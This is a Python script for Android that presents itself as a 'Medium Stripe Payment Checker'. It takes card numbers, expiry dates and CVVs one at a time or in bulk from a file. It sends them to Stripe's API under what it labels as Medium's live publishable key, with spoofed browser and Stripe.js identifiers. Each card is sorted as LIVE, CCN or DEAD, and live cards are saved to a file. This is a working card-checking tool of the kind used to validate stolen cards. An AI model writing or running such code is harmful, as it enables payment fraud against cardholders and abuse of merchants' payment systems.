"""
Medium Stripe Payment Checker for Pydroid3
Based on Stripe API integration with Medium.com

Usage:
    python medium.py
    
Or import and use:
    from medium import check_card
    result = check_card("4111111111111111", "12", "25", "123")
"""

import requests
import uuid
import time
import re
import json

class MediumChecker:
    """Medium.com Stripe Payment Checker"""
    
    def __init__(self):
        self.pk_key = "pk_live_7FReX44VnNIInZwrIIx6ghjl"
        self.stripe_version = "2025-03-31.basil"
        self.session = requests.Session()
        self._setup_session()
    
    def _setup_session(self):
        """Setup session with default headers"""
        self.session.headers.update({
            'accept': 'application/json',
            'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        })
    
    def _generate_ids(self):
        """Generate required UUID identifiers"""
        guid = str(uuid.uuid4()).replace('-', '')[:32] + str(uuid.uuid4())[:6]
        muid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
        sid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
        client_session_id = str(uuid.uuid4())
        return guid, muid, sid, client_session_id
    
    def create_payment_method(self, cc, mes, ano, cvv):
        """
        Create a Stripe payment method with card details
        
        Args:
            cc: Card number
            mes: Expiry month (MM)
            ano: Expiry year (YY or YYYY)
            cvv: CVV/CVC code
            
        Returns:
            dict: Payment method response or error
        """
        guid, muid, sid, client_session_id = self._generate_ids()
        
        # Format year if full year provided
        if len(str(ano)) == 4:
            ano = str(ano)[2:]
        
        # Ensure month is 2 digits
        mes = str(mes).zfill(2)
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
            'referrer': 'https://medium.com',
            'time_on_page': str(int(time.time() * 1000) % 100000),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
        }
        
        headers = {
            'authority': 'api.stripe.com',
            'content-type': 'application/x-www-form-urlencoded',
        }
        
        try:
            response = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=30
            )
            return response.json()
        except requests.exceptions.RequestException as e:
            return {'error': {'message': f'Request failed: {str(e)}'}}
        except json.JSONDecodeError:
            return {'error': {'message': 'Invalid JSON response'}}
    
    def confirm_payment_intent(self, payment_method_id, client_secret, payment_intent_id):
        """
        Confirm a payment intent with the payment method
        
        Args:
            payment_method_id: The PM ID from create_payment_method
            client_secret: The client secret for the payment intent
            payment_intent_id: The payment intent ID
            
        Returns:
            dict: Confirmation response
        """
        _, _, _, client_session_id = self._generate_ids()
        
        data = {
            'return_url': 'https://medium.com/welcome-member',
            'payment_method': payment_method_id,
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'l1',
            'client_secret': client_secret,
        }
        
        headers = {
            'authority': 'api.stripe.com',
            'content-type': 'application/x-www-form-urlencoded',
        }
        
        try:
            response = self.session.post(
                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
                headers=headers,
                data=data,
                timeout=30
            )
            return response.json()
        except requests.exceptions.RequestException as e:
            return {'error': {'message': f'Request failed: {str(e)}'}}
        except json.JSONDecodeError:
            return {'error': {'message': 'Invalid JSON response'}}
    
    def check(self, cc, mes, ano, cvv):
        """
        Full card check flow
        
        Args:
            cc: Card number
            mes: Expiry month
            ano: Expiry year
            cvv: CVV code
            
        Returns:
            dict: Result with status and message
        """
        result = {
            'card': f'{cc}|{mes}|{ano}|{cvv}',
            'status': 'Unknown',
            'response': '',
            'pm_id': None,
        }
        
        # Step 1: Create Payment Method
        pm_response = self.create_payment_method(cc, mes, ano, cvv)
        
        if 'error' in pm_response:
            error = pm_response['error']
            error_code = error.get('code', '')
            error_message = error.get('message', 'Unknown error')
            decline_code = error.get('decline_code', '')
            
            result['response'] = error_message
            result['error_code'] = error_code
            result['decline_code'] = decline_code
            
            # Classify the response
            if any(x in error_code.lower() for x in ['incorrect_cvc', 'invalid_cvc']):
                result['status'] = 'CCN'
                result['response'] = 'Invalid/Incorrect CVC'
            elif 'insufficient_funds' in str(decline_code).lower():
                result['status'] = 'LIVE'
                result['response'] = 'Insufficient Funds [LIVE]'
            elif 'card_declined' in error_code.lower():
                if decline_code:
                    result['response'] = f'Declined: {decline_code}'
                result['status'] = 'DEAD'
            elif 'expired_card' in error_code.lower():
                result['status'] = 'DEAD'
                result['response'] = 'Card Expired'
            elif 'incorrect_number' in error_code.lower():
                result['status'] = 'DEAD'
                result['response'] = 'Incorrect Card Number'
            elif 'invalid_expiry' in error_code.lower():
                result['status'] = 'DEAD'
                result['response'] = 'Invalid Expiry Date'
            elif 'processing_error' in error_code.lower():
                result['status'] = 'RETRY'
                result['response'] = 'Processing Error - Retry'
            elif 'rate_limit' in error_code.lower():
                result['status'] = 'RATE_LIMITED'
                result['response'] = 'Rate Limited - Try Again Later'
            else:
                result['status'] = 'DEAD'
                
            return result
        
        # Payment method created successfully
        pm_id = pm_response.get('id')
        card_info = pm_response.get('card', {})
        
        result['pm_id'] = pm_id
        result['brand'] = card_info.get('brand', 'Unknown')
        result['last4'] = card_info.get('last4', cc[-4:])
        result['funding'] = card_info.get('funding', 'Unknown')
        result['country'] = card_info.get('country', 'Unknown')
        
        # Check for 3DS requirement in checks
        checks = card_info.get('checks', {})
        cvc_check = checks.get('cvc_check', '')
        
        if cvc_check == 'pass':
            result['status'] = 'LIVE'
            result['response'] = 'Payment Method Created - CVC Pass'
        elif cvc_check == 'fail':
            result['status'] = 'CCN'
            result['response'] = 'CVC Check Failed'
        elif cvc_check == 'unchecked':
            result['status'] = 'LIVE'
            result['response'] = 'Payment Method Created - Unchecked'
        else:
            result['status'] = 'LIVE'
            result['response'] = f'Payment Method Created [{pm_id}]'
        
        return result


def check_card(cc, mes, ano, cvv):
    """
    Quick function to check a single card
    
    Args:
        cc: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV code
        
    Returns:
        dict: Check result
    """
    checker = MediumChecker()
    return checker.check(cc, mes, ano, cvv)


def parse_card(card_string):
    """
    Parse card string in various formats
    
    Supports:
        - 4111111111111111|12|25|123
        - 4111111111111111/12/25/123
        - 4111111111111111 12 25 123
        
    Returns:
        tuple: (cc, mes, ano, cvv) or None
    """
    patterns = [
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',  # pipe delimiter
        r'(\d{13,19})/(\d{1,2})/(\d{2,4})/(\d{3,4})',      # slash delimiter
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})', # space delimiter
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            return match.groups()
    return None


def format_result(result):
    """Format result for display"""
    status_emoji = {
        'LIVE': '✅',
        'CCN': '⚠️',
        'DEAD': '❌',
        'RETRY': '🔄',
        'RATE_LIMITED': '⏳',
        'Unknown': '❓'
    }
    
    emoji = status_emoji.get(result['status'], '❓')
    
    output = f"""
╔══════════════════════════════════╗
║     MEDIUM STRIPE CHECKER        ║
╠══════════════════════════════════╣
║ Card: {result['card']}
║ Status: {emoji} {result['status']}
║ Response: {result['response']}
"""
    
    if result.get('brand'):
        output += f"║ Brand: {result['brand'].upper()}\n"
    if result.get('funding'):
        output += f"║ Funding: {result['funding'].upper()}\n"
    if result.get('country'):
        output += f"║ Country: {result['country']}\n"
    if result.get('pm_id'):
        output += f"║ PM ID: {result['pm_id'][:20]}...\n"
        
    output += "╚══════════════════════════════════╝"
    
    return output


def check_multiple(cards_list):
    """
    Check multiple cards
    
    Args:
        cards_list: List of card strings
        
    Returns:
        dict: Results categorized by status
    """
    results = {
        'live': [],
        'ccn': [],
        'dead': [],
        'retry': [],
        'unknown': []
    }
    
    checker = MediumChecker()
    
    for card_string in cards_list:
        parsed = parse_card(card_string)
        if not parsed:
            print(f"Invalid format: {card_string}")
            continue
            
        cc, mes, ano, cvv = parsed
        result = checker.check(cc, mes, ano, cvv)
        
        status_lower = result['status'].lower()
        if status_lower == 'live':
            results['live'].append(result)
        elif status_lower == 'ccn':
            results['ccn'].append(result)
        elif status_lower == 'dead':
            results['dead'].append(result)
        elif status_lower in ['retry', 'rate_limited']:
            results['retry'].append(result)
        else:
            results['unknown'].append(result)
        
        print(format_result(result))
        time.sleep(1)  # Rate limiting
    
    return results


# Main execution for Pydroid3
if __name__ == "__main__":
    print("""
╔══════════════════════════════════╗
║     MEDIUM STRIPE CHECKER        ║
║        For Pydroid3              ║
╠══════════════════════════════════╣
║  Enter card: cc|mm|yy|cvv        ║
║  Type 'exit' to quit             ║
║  Type 'file' to check from file  ║
╚══════════════════════════════════╝
    """)
    
    while True:
        try:
            user_input = input("\n[>] Enter Card: ").strip()
            
            if user_input.lower() == 'exit':
                print("Goodbye!")
                break
            
            if user_input.lower() == 'file':
                filename = input("[>] Enter filename: ").strip()
                try:
                    with open(filename, 'r') as f:
                        cards = [line.strip() for line in f if line.strip()]
                    print(f"\n[*] Found {len(cards)} cards. Checking...")
                    results = check_multiple(cards)
                    
                    print(f"\n[+] Summary:")
                    print(f"    Live: {len(results['live'])}")
                    print(f"    CCN: {len(results['ccn'])}")
                    print(f"    Dead: {len(results['dead'])}")
                    print(f"    Retry: {len(results['retry'])}")
                    
                    # Save live cards
                    if results['live']:
                        with open('live_cards.txt', 'w') as f:
                            for r in results['live']:
                                f.write(f"{r['card']}\n")
                        print(f"[+] Live cards saved to live_cards.txt")
                    
                except FileNotFoundError:
                    print(f"[!] File not found: {filename}")
                continue
            
            parsed = parse_card(user_input)
            if not parsed:
                print("[!] Invalid format. Use: cc|mm|yy|cvv")
                continue
            
            cc, mes, ano, cvv = parsed
            print("\n[*] Checking card...")
            
            result = check_card(cc, mes, ano, cvv)
            print(format_result(result))
            
        except KeyboardInterrupt:
            print("\n\nGoodbye!")
            break
        except Exception as e:
            print(f"[!] Error: {str(e)}")
